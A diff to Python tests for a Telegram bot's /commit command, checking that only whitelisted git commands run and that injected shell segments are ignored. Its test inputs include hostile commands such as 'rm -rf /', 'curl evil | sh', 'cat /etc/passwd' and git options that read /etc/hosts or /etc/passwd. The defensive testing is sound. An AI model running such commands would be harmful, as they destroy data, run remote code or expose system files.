@@ -904,11 +904,13 @@ def test_commit_executes_only_valid_git_commands_and_ignores_non_git_segments(tm
 
     assert router.git.git_commands == [
         (backend, ["add", "-u"]),
-        (backend, ["commit", "-m", "safe"]),
+        (backend, ["commit", "-m", "safe", "--no-verify", "--no-post-rewrite", "--no-gpg-sign"]),
     ]
     assert bot.messages[-1][1].startswith('<pre><code class="language-bash">')
     assert f"${shlex.join(['git', 'add', '-u'])}" in bot.messages[-1][1]
-    assert f"${shlex.join(['git', 'commit', '-m', 'safe'])}" in bot.messages[-1][1]
+    assert html.escape(
+        f"${shlex.join(['git', 'commit', '-m', 'safe', '--no-verify', '--no-post-rewrite', '--no-gpg-sign'])}"
+    ) in bot.messages[-1][1]
     assert "---------------" in bot.messages[-1][1]
     assert "[Completed]" in bot.messages[-1][1]
     assert "[telegram-enhance 5b9a263] safe" in bot.messages[-1][1]
@@ -927,18 +929,18 @@ def test_commit_rejects_git_global_option_prefix(tmp_path: Path):
 
 def test_commit_ignores_multiple_shell_injection_patterns(tmp_path: Path):
     cases = [
-        ('/commit git status; python exploit.py; git commit -m "ok"', ("python exploit.py",)),
-        ('/commit git status&&rm -rf /&&git commit -m "ok"', ("rm -rf /",)),
-        ('/commit git status | cat /etc/passwd | git commit -m "ok"', ("cat /etc/passwd",)),
-        ('/commit git status & curl evil | sh & git commit -m "ok"', ("curl evil", "sh")),
-        ('/commit git status > /tmp/out && git commit -m "ok"', ("/tmp/out",)),
-        ('/commit git status >> /tmp/out && git commit -m "ok"', ("/tmp/out",)),
-        ('/commit git status < /tmp/in && git commit -m "ok"', ("/tmp/in",)),
-        ('/commit git status\nrm -rf /\ngit commit -m "ok"', ("rm -rf /",)),
-        ('/commit git status; $(touch /tmp/pwned); git commit -m "ok"', ("$(touch /tmp/pwned)",)),
-        ('/commit git status && `whoami` && git commit -m "ok"', ("`whoami`",)),
-        ('/commit git status && env VAR=1 python exploit.py && git commit -m "ok"', ("env VAR=1 python exploit.py",)),
-        ('/commit python exploit.py && git status && git commit -m "ok"', ("python exploit.py",)),
+        ('/commit git status; python exploit.py; git add -u', ("python exploit.py",)),
+        ('/commit git status&&rm -rf /&&git add -u', ("rm -rf /",)),
+        ('/commit git status | cat /etc/passwd | git add -u', ("cat /etc/passwd",)),
+        ('/commit git status & curl evil | sh & git add -u', ("curl evil", "sh")),
+        ('/commit git status > /tmp/out && git add -u', ("/tmp/out",)),
+        ('/commit git status >> /tmp/out && git add -u', ("/tmp/out",)),
+        ('/commit git status < /tmp/in && git add -u', ("/tmp/in",)),
+        ('/commit git status\nrm -rf /\ngit add -u', ("rm -rf /",)),
+        ('/commit git status; $(touch /tmp/pwned); git add -u', ("$(touch /tmp/pwned)",)),
+        ('/commit git status && `whoami` && git add -u', ("`whoami`",)),
+        ('/commit git status && env VAR=1 python exploit.py && git add -u', ("env VAR=1 python exploit.py",)),
+        ('/commit python exploit.py && git status && git add -u', ("python exploit.py",)),
     ]
     router, backend = _make_commit_router(
         tmp_path,
@@ -946,7 +948,7 @@ def test_commit_ignores_multiple_shell_injection_patterns(tmp_path: Path):
             is_git_repo=True,
             git_command_results=[
                 SimpleNamespace(success=True, message="git status completed."),
-                SimpleNamespace(success=True, message="git commit completed."),
+                SimpleNamespace(success=True, message="git add completed."),
             ]
             * len(cases),
         ),
@@ -957,7 +959,7 @@ def test_commit_ignores_multiple_shell_injection_patterns(tmp_path: Path):
 
         assert router.git.git_commands[-2:] == [
             (backend, ["status"]),
-            (backend, ["commit", "-m", "ok"]),
+            (backend, ["add", "-u"]),
         ]
         for fragment in ignored_fragments:
             assert fragment in bot.messages[-1][1]
@@ -973,8 +975,12 @@ def test_commit_rejects_malformed_or_prefixed_non_git_commands(tmp_path: Path):
         '/commit git status git push origin main',
         '/commit git add --pathspec-from-file /etc/hosts',
         '/commit git add --pathspec-from-file=/etc/hosts',
+        '/commit git add --pathspec-from-f=/etc/hosts',
         '/commit git commit -F /etc/hosts',
+        '/commit git commit -F/etc/hosts',
         '/commit git commit --file=/etc/hosts',
+        '/commit git commit --allow-empty --fil=/etc/hosts',
+        '/commit git commit --templ=/etc/hosts',
         '/commit git diff -- README.md',
         '/commit git diff --no-index /etc/passwd /dev/null',
     ]
@@ -994,40 +1000,65 @@ def test_commit_allows_adjacent_valid_git_commands_without_spaces(tmp_path: Path
             is_git_repo=True,
             git_command_results=[
                 SimpleNamespace(success=True, message="git status completed."),
+                SimpleNamespace(success=True, message="git add completed."),
+            ],
+        ),
+    )
+
+    bot = _run_commit_command(router, '/commit git status&&git add -u')
+
+    assert router.git.git_commands == [
+        (backend, ["status"]),
+        (backend, ["add", "-u"]),
+    ]
+    assert bot.messages[-1][1].startswith('<pre><code class="language-bash">')
+    assert f"${shlex.join(['git', 'status'])}" in bot.messages[-1][1]
+    assert f"${shlex.join(['git', 'add', '-u'])}" in bot.messages[-1][1]
+    assert "[Completed]" in bot.messages[-1][1]
+    assert "Ignored non-git commands:" not in bot.messages[-1][1]
+
+
+def test_commit_allows_common_safe_short_forms(tmp_path: Path):
+    router, backend = _make_commit_router(
+        tmp_path,
+        git_manager=FakeGitManager(
+            is_git_repo=True,
+            git_command_results=[
+                SimpleNamespace(success=True, message="git status completed."),
                 SimpleNamespace(success=True, message="git commit completed."),
             ],
         ),
     )
 
-    bot = _run_commit_command(router, '/commit git status&&git commit -m "ok"')
+    bot = _run_commit_command(router, '/commit git status -sb&&git commit -msafe')
 
     assert router.git.git_commands == [
-        (backend, ["status"]),
-        (backend, ["commit", "-m", "ok"]),
+        (backend, ["status", "-sb"]),
+        (backend, ["commit", "-msafe", "--no-verify", "--no-post-rewrite", "--no-gpg-sign"]),
     ]
-    assert bot.messages[-1][1].startswith('<pre><code class="language-bash">')
-    assert f"${shlex.join(['git', 'status'])}" in bot.messages[-1][1]
-    assert f"${shlex.join(['git', 'commit', '-m', 'ok'])}" in bot.messages[-1][1]
+    assert f"${shlex.join(['git', 'status', '-sb'])}" in bot.messages[-1][1]
+    assert html.escape(
+        f"${shlex.join(['git', 'commit', '-msafe', '--no-verify', '--no-post-rewrite', '--no-gpg-sign'])}"
+    ) in bot.messages[-1][1]
     assert "[Completed]" in bot.messages[-1][1]
-    assert "Ignored non-git commands:" not in bot.messages[-1][1]
 
 
-def test_commit_allows_shell_like_text_inside_quoted_commit_message(tmp_path: Path):
+def test_commit_allows_shell_like_text_inside_quoted_pathspec(tmp_path: Path):
     router, backend = _make_commit_router(
         tmp_path,
         git_manager=FakeGitManager(
             is_git_repo=True,
-            git_command_results=[SimpleNamespace(success=True, message="git commit completed.")],
+            git_command_results=[SimpleNamespace(success=True, message="git add completed.")],
         ),
     )
 
-    bot = _run_commit_command(router, '/commit git commit -m "fix docs && keep | chars > literally"')
+    bot = _run_commit_command(router, '/commit git add "file && keep | chars > literally.txt"')
 
     assert router.git.git_commands == [
-        (backend, ["commit", "-m", "fix docs && keep | chars > literally"]),
+        (backend, ["add", "file && keep | chars > literally.txt"]),
     ]
     assert bot.messages[-1][1].startswith('<pre><code class="language-bash">')
-    assert html.escape(f"${shlex.join(['git', 'commit', '-m', 'fix docs && keep | chars > literally'])}") in bot.messages[-1][1]
+    assert html.escape(f"${shlex.join(['git', 'add', 'file && keep | chars > literally.txt'])}") in bot.messages[-1][1]
     assert "[Completed]" in bot.messages[-1][1]
     assert "Ignored non-git commands:" not in bot.messages[-1][1]
 
